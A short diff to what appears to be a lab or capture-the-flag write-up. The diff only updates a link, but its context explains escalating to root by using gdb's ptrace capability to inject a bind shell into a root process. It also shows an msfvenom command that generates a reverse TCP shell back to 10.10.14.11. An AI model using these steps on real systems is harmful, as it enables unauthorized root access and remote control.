@@ -309,7 +309,7 @@ getcap /usr/bin/gdb
 
 The ptrace capability here allows the affected script to attach to other processes and trace their system calls. With gdb it should allow us to attach to a root process and inject into its memory a shell. I started trying a regular shell but ended up using a bind shell after some testing. 
 
-[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace) has more about creating a payload. The payload generator is pasted below, change the top buf variable to be the bind shell [https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128). 
+[https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_ptrace](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_ptrace) has more about creating a payload. The payload generator is pasted below, change the top buf variable to be the bind shell [https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128). 
 
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
